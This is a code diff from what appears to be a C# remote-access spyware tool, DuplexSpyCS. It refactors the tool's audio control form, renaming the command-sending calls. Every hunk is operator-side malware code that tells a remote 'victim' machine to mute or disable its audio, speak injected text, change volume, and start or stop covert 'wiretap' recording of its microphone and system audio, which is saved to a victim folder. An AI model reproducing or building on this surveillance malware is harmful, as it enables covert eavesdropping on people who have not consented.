@@ -277,7 +277,7 @@ namespace DuplexSpyCS
             textBox4.ReadOnly = true;
             textBox5.ReadOnly = true;
 
-            v.encSend(2, 0, "audio|init");
+            v.fnSendCommand("audio|init");
         }
 
         private void frmAudio_Load(object sender, EventArgs e)
@@ -296,12 +296,12 @@ namespace DuplexSpyCS
             string state = button1.Text;
             if (state == "Mute")
             {
-                v.encSend(2, 0, "audio|mute|mute");
+                v.fnSendCommand("audio|mute|mute");
                 button1.Text = "Unmute";
             }
             else
             {
-                v.encSend(2, 0, "audio|mute|unmute");
+                v.fnSendCommand("audio|mute|unmute");
                 button1.Text = "Mute";
             }
         }
@@ -312,18 +312,18 @@ namespace DuplexSpyCS
             string state = button8.Text.ToLower();
             if (state.Contains("disable")) //DISABLE
             {
-                v.encSend(2, 0, "audio|mute|disable");
+                v.fnSendCommand("audio|mute|disable");
             }
             else //ENABLE
             {
-                v.encSend(2, 0, "audio|mute|enable");
+                v.fnSendCommand("audio|mute|enable");
             }
         }
 
         //SPEECH TEXT
         private void button2_Click(object sender, EventArgs e)
         {
-            v.encSend(2, 0, "audio|speak|text|" + clsCrypto.b64E2Str(textBox1.Text) + "|" + trackBar1.Value.ToString());
+            v.fnSendCommand("audio|speak|text|" + clsCrypto.b64E2Str(textBox1.Text) + "|" + trackBar1.Value.ToString());
         }
 
         //START/STOP BUGGING MICROPHONE
@@ -333,12 +333,12 @@ namespace DuplexSpyCS
             string idx = comboBox1.SelectedIndex.ToString();
             if (state == "start")
             {
-                v.encSend(2, 0, $"audio|wiretap|micro|on|start|Microphone|" + idx);
+                v.fnSendCommand($"audio|wiretap|micro|on|start|Microphone|" + idx);
                 button4.Text = "Stop";
             }
             else
             {
-                v.encSend(2, 0, $"audio|wiretap|micro|on|stop|Microphone|" + idx);
+                v.fnSendCommand($"audio|wiretap|micro|on|stop|Microphone|" + idx);
                 button4.Text = "Start";
             }
         }
@@ -350,7 +350,7 @@ namespace DuplexSpyCS
             string idx = comboBox1.SelectedIndex.ToString();
             if (state == "record")
             {
-                //v.encSend(2, 0, $"audio|wiretap|micro|on|write|Microphone");
+                //v.fnSendCommand($"audio|wiretap|micro|on|write|Microphone");
                 string dir = Path.Combine(v.dir_victim, "Audio");
                 if (!Directory.Exists(dir))
                     Directory.CreateDirectory(dir);
@@ -384,12 +384,12 @@ namespace DuplexSpyCS
             string idx = comboBox2.SelectedIndex.ToString();
             if (state == "start")
             {
-                v.encSend(2, 0, $"audio|wiretap|system|on|start|Audio|" + idx);
+                v.fnSendCommand($"audio|wiretap|system|on|start|Audio|" + idx);
                 button7.Text = "Stop";
             }
             else
             {
-                v.encSend(2, 0, $"audio|wiretap|system|on|stop|Audio|" + idx);
+                v.fnSendCommand($"audio|wiretap|system|on|stop|Audio|" + idx);
                 button7.Text = "Start";
             }
         }
@@ -430,7 +430,7 @@ namespace DuplexSpyCS
         private void trackBar1_MouseUp(object sender, MouseEventArgs e)
         {
             float vol = trackBar1.Value / 1.0f;
-            v.encSend(2, 0, "audio|vol|" + $"{vol.ToString()}");
+            v.fnSendCommand("audio|vol|" + $"{vol.ToString()}");
         }
 
         private void trackBar1_KeyUp(object sender, KeyEventArgs e)
